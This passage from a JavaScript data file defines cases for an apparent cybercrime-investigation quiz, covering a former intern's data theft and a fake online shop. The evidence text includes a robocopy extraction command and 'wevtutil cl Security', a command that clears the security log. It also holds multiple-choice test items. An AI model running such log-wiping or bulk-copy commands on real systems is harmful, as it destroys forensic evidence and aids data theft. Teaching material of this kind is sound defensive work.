          "Turning down computer volume",
          "Disabling Bluetooth",
          "Using the browser in full screen mode",
          "Using a reliable encrypted VPN tunnel or enforcing Wireless Client Isolation on the access point"
        ]
      },
      {
        "text": "What does 'Client Isolation' do when configured on an enterprise coffee shop Wi-Fi network?",
        "options": [
          "It blocks all websites except news portals",
          "It disconnects all users after 10 minutes",
          "It prevents wireless clients from communicating with or eavesdropping on each other on the local subnet",
          "It charges a fee for using Wi-Fi"
        ]
      },
      {
        "text": "Reconstructing the attacker's multi-stage kill chain, what was the sequential progression of the attack?",
        "options": [
          "Linked banking resets -> Forwarding rule created -> 42 MFA fatigue prompts -> ARP poisoning",
          "Coffee shop ARP poisoning -> Credentials intercepted -> 42 MFA fatigue prompts -> Recovery phone changed -> Forwarding rule created -> Linked banking resets",
          "Forwarding rule created -> 42 MFA fatigue prompts -> Linked banking resets -> ARP poisoning",
          "ARP poisoning -> Forwarding rule created -> Linked banking resets -> 42 MFA fatigue prompts"
        ]
      },
      {
        "text": "What comprehensive response protocol is necessary to fully evict the adversary from the compromised account ecosystem?",
        "options": [
          "Revoke all active sessions, reset password, update recovery phone, delete forwarding rules, revoke OAuth app tokens, and contact banks",
          "Close the browser tab and restart the computer",
          "Simply change the password on the phone and do nothing else",
          "Delete all emails in the inbox"
        ]
      }
    ]
  },
  "case-14": {
    "id": "case-14",
    "name": "CASE 14 — UNAUTHORISED DATA ACCESS",
    "summary": "Confidential files have been accessed without permission. Examine the available records to understand what happened.",
    "evidence": [
      {
        "tag": "SERVER AUDIT",
        "time": "INCIDENT RECORD 01",
        "title": "OFF-HOURS FILE TRANSFER",
        "details": "2.4 GB of confidential faculty evaluation archives downloaded on Sunday at 01:22 AM UTC from internal fileserver."
      },
      {
        "tag": "AUTHENTICATION",
        "time": "INCIDENT RECORD 02",
        "title": "FORMER INTERN CREDENTIALS",
        "details": "Access authenticated using credentials belonging to former IT intern 'sanjay_intern', whose contract ended 3 months ago."
      },
      {
        "tag": "ACCOUNT STATUS",
        "time": "INCIDENT RECORD 03",
        "title": "FAILURE TO REVOKE ACCESS",
        "details": "HR and IT department offboarding audit revealed the intern account was never disabled or deprovisioned upon departure."
      },
      {
        "tag": "NETWORK VPN LOG",
        "time": "INCIDENT RECORD 04",
        "title": "HOME BROADBAND CONNECTION",
        "details": "VPN connection initiated from home residential broadband IP address 122.164.89.200 registered to the former intern's hometown."
      }
    ],
    "round2Evidence": [
      {
        "tag": "ACTIVE DIRECTORY AUDIT",
        "time": "01:15:00 UTC",
        "title": "PRIVILEGE ESCALATION PERSISTENCE",
        "details": "Event ID 4728 audit log confirms 'sanjay_intern' added themselves to the high-privilege Active Directory security group 'Faculty-Archive-Admins' 4 days before their contract concluded."
      },
      {
        "tag": "COMMAND LOG",
        "time": "01:24:45 UTC",
        "title": "BULK EXTRACTION COMMAND",
        "details": "Terminal history demonstrates execution of 'robocopy \\\\fileserver\\confidential\\evaluations C:\\temp\\exfil /E /Z /R:1 /W:1' followed by 7-Zip password-protected compression."
      },
      {
        "tag": "EVENT LOG PURGE",
        "time": "01:28:10 UTC",
        "title": "CLEAR SECURITY LOG ATTEMPT",
        "details": "Execution of 'wevtutil cl Security' command detected; event log clearing generated Event ID 1102 ('The audit log was cleared'), creating immediate forensic evidence."
      },
      {
        "tag": "CLOUD EXFILTRATION",
        "time": "01:32:00 UTC",
        "title": "UPLOAD TO CLOUD LOCKER",
        "details": "Firewall logs document high-volume outbound HTTPS data stream uploading 2.4 GB encrypted container to anonymous file storage host Mega.nz."
      }
    ],
    "questions": [
      {
        "text": "What size of confidential archives was downloaded from the internal fileserver?",
        "options": [
          "100 GB",
          "50 MB",
          "2.4 GB",
          "500 KB"
        ]
      },
      {
        "text": "At what day and time did the suspicious file transfer occur?",
        "options": [
          "Wednesday at 12:00 PM UTC",
          "Sunday at 01:22 AM UTC",
          "Monday at 10:00 AM UTC",
          "Friday at 03:00 PM UTC"
        ]
      },
      {
        "text": "Whose user account credentials were used to authenticate the access?",
        "options": [
          "Former intern 'sanjay_intern'",
          "Head of Department",
          "Guest Wi-Fi user",
          "College Principal"
        ]
      },
      {
        "text": "How long ago did the intern's contract with the college end?",
        "options": [
          "Yesterday",
          "1 week ago",
          "10 years ago",
          "3 months ago"
        ]
      },
      {
        "text": "What institutional failure allowed the former intern to still log into the network?",
        "options": [
          "The intern bought the college domain name",
          "The college server was infected with a hardware virus",
          "Failure to deprovision or disable the account during the offboarding process",
          "The intern hacked NASA satellites"
        ]
      },
      {
        "text": "What network tool was used to connect remotely to the internal college network from home?",
        "options": [
          "FM Radio transmitter",
          "Campus Virtual Private Network (VPN)",
          "Bluetooth",
          "HDMI cable"
        ]
      },
      {
        "text": "What residential IP address initiated the remote VPN connection?",
        "options": [
          "122.164.89.200",
          "127.0.0.1",
          "192.168.1.1",
          "10.0.0.1"
        ]
      },
      {
        "text": "What type of confidential files were exfiltrated in the transfer?",
        "options": [
          "Library book titles",
          "Public cafeteria food menus",
          "Sports field booking calendar",
          "Faculty evaluation archives"
        ]
      },
      {
        "text": "Why is an offboarding checklist mandatory in enterprise and institutional IT governance?",
        "options": [
          "To delete all college student emails",
          "To give departing staff free software licenses",
          "To ensure departing personnel have all access tokens, accounts, and VPN keys revoked immediately",
          "To print goodbye cards for departing staff"
        ]
      },
      {
        "text": "What term describes accounts belonging to former employees that remain active in the system?",
        "options": [
          "Admin root accounts",
          "Dormant / Orphan accounts",
          "Superuser accounts",
          "Guest accounts"
        ]
      },
      {
        "text": "Why was downloading data at 01:22 AM on Sunday an immediate behavioral red flag?",
        "options": [
          "It was outside normal college working hours on a weekend, indicating stealth off-hours access",
          "Because servers are only allowed to send data during morning hours",
          "Because internet connections do not work on Sundays",
          "Because all files downloaded at night are automatically corrupted"
        ]
      },
      {
        "text": "What security principle dictates that interns should only have access to data required for their specific tasks?",
        "options": [
          "Principle of Maximum Access",
          "Open Door Policy",
          "Public Access Rule",
          "Principle of Least Privilege"
        ]
      },
      {
        "text": "What immediate technical action should IT take upon discovering the rogue transfer?",
        "options": [
          "Format the entire college fileserver",
          "Wait 2 weeks to see if more files are downloaded",
          "Immediately disable the intern account, terminate the active VPN tunnel, and preserve server audit logs",
          "Send an email asking the intern why they downloaded the files"
        ]
      },
      {
        "text": "Why are former employees with retained access classified as an 'Insider Threat'?",
        "options": [
          "They are exempt from all cyber laws",
          "They possess legitimate credentials, understand internal network topography, and know where valuable data is stored",
          "They cannot be detected by antivirus scanners",
          "They are physically inside the building at all times"
        ]
      },
      {
        "text": "What is the primary operational distinction between an account compromise and an offboarding failure?",
        "options": [
          "In an offboarding failure, legitimate credentials remain valid due to administrative negligence rather than external hacking",
          "There is no difference; they are identical",
          "Offboarding failure means the server was physically stolen",
          "Account compromise only happens on Linux"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "What high-privilege Active Directory security group did the intern add themselves to before departure?",
        "options": [
          "Print Operators",
          "Faculty-Archive-Admins",
          "Domain Admins",
          "Enterprise Admins"
        ]
      },
      {
        "text": "What Windows Event ID explicitly logs the addition of a user to a security-enabled global group?",
        "options": [
          "Event ID 4728",
          "Event ID 4624",
          "Event ID 1102",
          "Event ID 7045"
        ]
      },
      {
        "text": "What Windows command-line utility was used to copy the directories recursively?",
        "options": [
          "copy",
          "ftp",
          "xcopy",
          "robocopy"
        ]
      },
      {
        "text": "What Windows utility was executed to attempt clearing the Security audit log?",
        "options": [
          "clear-eventlog",
          "del C:\\Windows\\System32\\winevt\\Logs",
          "wevtutil cl Security",
          "net stop eventlog"
        ]
      },
      {
        "text": "What Windows Event ID is generated when an administrator or attacker clears the security log?",
        "options": [
          "Event ID 6005",
          "Event ID 1102 ('The audit log was cleared')",
          "Event ID 4624",
          "Event ID 4672"
        ]
      },
      {
        "text": "To which cloud locker service was the 2.4 GB encrypted container exfiltrated?",
        "options": [
          "Mega.nz",
          "Google Drive",
          "Dropbox",
          "OneDrive"
        ]
      },
      {
        "text": "How many days before the intern contract concluded did the unauthorized group addition occur?",
        "options": [
          "2 months after departure",
          "30 days before",
          "On the day of the download",
          "4 days before"
        ]
      },
      {
        "text": "What software was used to compress and password-protect the exfiltrated directory?",
        "options": [
          "Tar",
          "Gzip",
          "7-Zip",
          "WinRAR"
        ]
      },
      {
        "text": "Why did the attacker's attempt to clear the audit log using 'wevtutil' fail to cover their tracks?",
        "options": [
          "The command shut down the computer",
          "Clearing the security log automatically writes a tamper-evident Event ID 1102 with the executing username and timestamp",
          "Windows does not allow event logs to be cleared",
          "Event logs are printed on paper automatically"
        ]
      },
      {
        "text": "What data egress monitoring tool should have alerted on a 2.4 GB outbound upload to Mega.nz?",
        "options": [
          "Data Loss Prevention (DLP) / Cloud Access Security Broker (CASB)",
          "Antivirus software",
          "Local display driver",
          "DHCP server"
        ]
      },
      {
        "text": "Why should temporary intern accounts always have hard expiration dates configured in Active Directory?",
        "options": [
          "It deletes all files created by the intern",
          "It prevents the intern from using the college library",
          "It makes the computer run 50% faster",
          "Account expiration automatically disables the account on the set date regardless of manual HR offboarding oversights"
        ]
      },
      {
        "text": "What SIEM (Security Information and Event Management) alert rule would have flagged the privilege escalation immediately?",
        "options": [
          "A rule checking monitor screen resolution",
          "An alert on daily printer paper usage",
          "Real-time alert on Event ID 4728 monitoring changes to privileged administrative groups",
          "An alert on mouse clicks per minute"
        ]
      },
      {
        "text": "What legal liability does a former intern face for unauthorized data exfiltration under cyber law?",
        "options": [
          "No liability because they had an account previously",
          "Criminal prosecution under IT Act Section 43/66 (unauthorized data extraction, breach of confidentiality) and IPC/BNS",
          "Automatic promotion to senior system administrator",
          "A certificate in advanced ethical hacking"
        ]
      },
      {
        "text": "Reconstructing the attacker's complete methodology, what were the four distinct phases of the intrusion?",
        "options": [
          "Pre-departure privilege escalation (AD group addition) -> Post-departure off-hours VPN login -> Robocopy bulk extraction & log wipe -> Encrypted cloud exfiltration",
          "Robocopy extraction -> Privilege escalation -> VPN login -> Encrypted cloud exfiltration",
          "VPN login -> Encrypted cloud exfiltration -> Privilege escalation -> Robocopy extraction",
          "Encrypted cloud exfiltration -> Robocopy extraction -> Privilege escalation -> VPN login"
        ]
      },
      {
        "text": "What organizational and technical reforms are required to permanently prevent similar insider breaches?",
        "options": [
          "Deleting all administrative groups from Active Directory",
          "Prohibiting all internships across the entire university",
          "Turning off the campus VPN server completely",
          "Automated HR-IT offboarding deprovisioning, mandatory AD account expiration, MFA on VPN, and DLP egress blocking"
        ]
      }
    ]
  },
  "case-15": {
    "id": "case-15",
    "name": "CASE 15 — ONLINE SHOPPING FRAUD",
    "summary": "A customer pays for a product that never arrives. Analyse the transaction details to identify the possible fraud.",
    "evidence": [
      {
        "tag": "SHOPPING AD",
        "time": "INCIDENT RECORD 01",
        "title": "SPONSORED SOCIAL MEDIA AD",
        "details": "Victim clicked an Instagram sponsored ad offering high-end gaming laptops at an impossible 80% discount from 'NextGen-Electronics-Store'."
      },
      {
        "tag": "TRANSACTION TRACE",
        "time": "INCIDENT RECORD 02",
        "title": "IMMEDIATE CASH CASHOUT",
        "details": "Payment of ₹12,000 sent to a personal savings account VPA 'gadget_hub_corp@ybl' and instantly withdrawn via physical ATM 10 minutes later."
      },
      {
        "tag": "SUPPORT CONTACT",
        "time": "INCIDENT RECORD 03",
        "title": "DEAD CONTACT INFORMATION",
        "details": "Customer support email 'support@nextgen-store.shop' bounces with 'Address not found'; customer care phone number is permanently switched off."
      },
      {
        "tag": "DOMAIN WHOIS",
        "time": "INCIDENT RECORD 04",
        "title": "DISPOSABLE 1-WEEK OLD DOMAIN",
        "details": "Online shop storefront domain was registered 5 days ago and is already flagged on multiple consumer complaint forums for non-delivery."
      }
    ],
    "round2Evidence": [
      {
        "tag": "TRACKING TELEMETRY",
        "time": "20:10:00 UTC",
        "title": "FICTITIOUS SHIPMENT CHECKPOINTS",
        "details": "The fake tracking page 'nextgen-track.com' displayed synthetic GPS checkpoints advancing every 4 hours automatically via client-side JavaScript math."
      },
      {
        "tag": "BANKING MULE NETWORK",
        "time": "20:25:30 UTC",
        "title": "SHELL ACCOUNT KYC MISMATCH",
        "details": "Bank investigation reveals the receiving account belonged to a compromised rural account holder whose KYC documents were stolen during a microloan scam."
      },
      {
        "tag": "AD ACCOUNT AUDIT",
        "time": "20:38:00 UTC",
        "title": "STOLEN AD ACCOUNT FUNDING",
        "details": "The sponsored Instagram ad campaign was launched from a hacked third-party business ad account funded by compromised corporate credit cards."
      },
      {
        "tag": "CYBERCRIME CORRELATION",
        "time": "20:50:00 UTC",
        "title": "SERIAL FRAUD SYNDICATE LINK",
        "details": "The VPA 'gadget_hub_corp@ybl' and registrar email are linked to 48 similar fake storefront campaigns across 6 states over the past 90 days."
      }
    ],
    "questions": [
      {
        "text": "How much money did the customer pay for the gaming laptop that never arrived?",
        "options": [
          "₹1,00,000",
          "₹12,000",
          "₹500",
          "₹5,000"
        ]
      },
      {
        "text": "Where did the victim originally encounter the fraudulent storefront advertisement?",
        "options": [
          "A sponsored Instagram social media ad",
          "A physical newspaper flyer",
          "The college library notice board",
          "A television commercial"
        ]
      },
      {
        "text": "What discount percentage was advertised to lure the buyer?",
        "options": [
          "10% discount",
          "No discount",
          "5% discount",
          "80% discount"
        ]
      },
      {
        "text": "What happened when the customer attempted to email customer support?",
        "options": [
          "Support scheduled a phone call",
          "The email was forwarded to the college dean",
          "The email bounced back with 'Address not found'",
          "Support replied with a full refund in 5 minutes"
        ]
      },
      {
        "text": "What VPA received the victim's ₹12,000 payment?",
        "options": [
          "flipkart_hub@icici",
          "gadget_hub_corp@ybl",
          "canteen@axis",
          "amazon_pay@sbi"
        ]
      },
      {
        "text": "How quickly was the money withdrawn at an ATM after the customer transferred it?",
        "options": [
          "10 minutes later",
          "3 months later",
          "It was never withdrawn",
          "After 2 weeks"
        ]
      },
      {
        "text": "How old was the online shop's domain name according to WHOIS records?",
        "options": [
          "1 year old",
          "10 years old",
          "500 days old",
          "5 days old"
        ]
      },
      {
        "text": "What was the status of the customer care phone number when dialed?",
        "options": [
          "Connected to a bank manager",
          "Answered by friendly staff",
          "Permanently switched off",
          "Voicemail with return details"
        ]
      },
      {
        "text": "What payment method on legitimate e-commerce sites provides the best fraud protection for buyers?",
        "options": [
          "Gift card codes sent over chat",
          "Cash on Delivery (COD) or Verified Payment Gateways with buyer protection policies",
          "Direct advance UPI to personal phone numbers",
          "Cash sent in paper envelopes"
        ]
      },
      {
        "text": "Does an ad appearing on Instagram or Facebook mean the seller is verified and genuine?",
        "options": [
          "No, anyone can pay to run sponsored ads on social platforms without thorough product vetting",
          "Yes, ads can only be created by licensed retail stores",
          "Yes, social media companies physically inspect every product before showing an ad",
          "Yes, sponsored ads are guaranteed by the government"
        ]
      },
      {
        "text": "What fake store name was used in the sponsored ad?",
        "options": [
          "BestBuy India",
          "Official Apple Store",
          "Amazon Super Store",
          "NextGen-Electronics-Store"
        ]
      },
      {
        "text": "What top-level domain (TLD) extension was used for the customer support email?",
        "options": [
          ".com",
          ".edu",
          ".shop",
          ".gov.in"
        ]
      },
      {
        "text": "What should a victim do immediately after realizing they were defrauded by a fake online shop?",
        "options": [
          "Delete all receipts and text messages",
          "File an immediate complaint on the National Cybercrime Portal (cybercrime.gov.in) and report the transaction to their bank",
          "Wait 30 days for the laptop to arrive",
          "Order another laptop from the same website"
        ]
      },
      {
        "text": "Why do fraudulent stores withdraw money via physical ATMs almost immediately?",
        "options": [
          "To prevent banks from placing an electronic freeze or lien on the account once the victim reports fraud",
          "To pay taxes to the government immediately",
          "Because ATMs give cash bonuses for fast withdrawals",
          "Because digital bank accounts cannot hold money overnight"
        ]
      },
      {
        "text": "Why is customer review verification outside the seller's website critical before making online purchases?",
        "options": [
          "Independent portals are illegal in India",
          "Reviews cannot be typed on mobile phones",
          "Reviews on the seller's site are verified by court judges",
          "On-site reviews can be fabricated by the scammers; independent consumer complaint portals expose real fraud reports"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "How did the fake package tracking page 'nextgen-track.com' simulate package movement?",
        "options": [
          "Using client-side JavaScript math to display synthetic GPS checkpoints advancing every 4 hours automatically",
          "Displaying real-time drone video feeds",
          "Connecting to satellite tracking antennas",
          "Calling the courier driver every 10 minutes"
        ]
      },
      {
        "text": "Whose identity was used to open the fraudulent bank account that received the ₹12,000?",
        "options": [
          "A fictitious account created without any documents",
          "The scammer's real legal personal bank account",
          "The college principal's account",
          "A compromised rural account holder whose KYC documents were stolen during a microloan scam (money mule)"
        ]
      },
      {
        "text": "How was the sponsored Instagram ad campaign financed by the scammers?",
        "options": [
          "With official bank loans",
          "With cash paid at the Instagram headquarters",
          "From a hacked third-party business ad account funded by compromised corporate credit cards",
          "Instagram runs all shopping ads for free"
        ]
      },
      {
        "text": "How many similar fake storefront campaigns was the VPA 'gadget_hub_corp@ybl' linked to over 90 days?",
        "options": [
          "Only this 1 campaign",
          "48 similar campaigns across 6 states",
          "Zero campaigns",
          "1,000,000 campaigns"
        ]
      },
      {
        "text": "What is the primary function of a 'synthetic tracking page' in an e-commerce scam?",
        "options": [
          "To delay the victim from reporting fraud to their bank for several days by showing fake 'in-transit' progress",
          "To speed up airplane flights",
          "To calculate courier fuel taxes",
          "To help the delivery driver find the address"
        ]
      },
      {
        "text": "What does 'KYC' stand for in banking and financial account regulation?",
        "options": [
          "Key Yield Calculation",
          "Knowledge Year Credit",
          "Keep Your Cash",
          "Know Your Customer"
        ]
      },
      {
        "text": "Why do cybercrime syndicates steal rural citizens' identity documents to create bank accounts?",
        "options": [
          "Because rural accounts have unlimited free international wires",
          "Because rural accounts cannot be frozen by courts",
          "To create disposable mule accounts that insulate the real syndicate leaders from police arrests",
          "Because rural citizens own all the ATMs"
        ]
      },
      {
        "text": "What domain name was used to host the fake shipment tracking system?",
        "options": [
          "fedex.com",
          "nextgen-track.com",
          "indiapost.gov.in",
          "dhl.com"
        ]
      },
      {
        "text": "Why are social media platforms targeted by ad-account hijackers for scam distribution?",
        "options": [
          "Hijacked ad accounts have verified billing history and high daily spending limits, evading new-account review algorithms",
          "Social platforms do not support video ads",
          "Hijacked ad accounts can only run ads for laptops",
          "Social platforms have no users"
        ]
      },
      {
        "text": "How do cybercrime investigators correlate disparate scam campaigns to a single syndicate?",
        "options": [
          "By measuring the size of the product photographs",
          "By checking if the website font is Arial or Times New Roman",
          "By looking at the color of the website buttons",
          "By cross-referencing shared VPAs, IFSC bank codes, registrar email addresses, and server hosting subnets"
        ]
      },
      {
        "text": "What is the role of an ATM CCTV footage audit in unmasking money mule cash-out networks?",
        "options": [
          "It tests the clarity of ATM glass doors",
          "It checks if the ATM keypad needs cleaning",
          "It captures timestamped physical facial imagery and vehicle details of the runner withdrawing cash",
          "It calculates how many bank customers visit each day"
        ]
      },
      {
        "text": "What consumer protection regulation in India requires e-commerce entities to display nodal grievance officers?",
        "options": [
          "Merchant Shipping Act",
          "Consumer Protection (E-Commerce) Rules, 2020",
          "Motor Vehicles Amendment Act",
          "Factories Act of 1948"
        ]
      },
      {
        "text": "How can prospective buyers verify whether an e-commerce website was registered only 5 days ago?",
        "options": [
          "By checking domain creation dates on ICANN WHOIS lookup portals",
          "By converting the webpage to a PDF",
          "By checking the battery percentage on their smartphone",
          "By checking the weather forecast"
        ]
      },
      {
        "text": "Reconstructing the syndicated shopping fraud operation, what were the four key components of the criminal enterprise?",
        "options": [
          "Social engineering phone call -> Desktop virus -> Hardware repair -> Invoice billing",
          "Physical retail store -> TV advertising -> Post office delivery -> Government bank wire",
          "Local Wi-Fi snooping -> Ransomware encryption -> Bitcoin ransom -> Decryption key",
          "Hacked ad accounts for reach -> Disposable 5-day lookalike storefront -> Synthetic tracking page -> Stolen-KYC mule bank accounts with rapid ATM cash-out"
        ]
      },
      {
        "text": "What multi-agency coordination strategy is required to dismantle this 48-campaign fraud network?",
        "options": [
          "Banning all online shopping in the country",
          "Asking students to avoid using the internet",
          "Inter-state cyber police coordination, nodal bank account freezing, registrar domain takedowns, and social platform ad-fraud reporting",
          "Changing the currency notes again"
        ]
      }
    ]
  }
};

// Expose on window for client-side rendering
if (typeof window !== 'undefined') {
  window.TRACE_INVESTIGATION_CASES = TRACE_INVESTIGATION_CASES;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = { TRACE_INVESTIGATION_CASES };
}
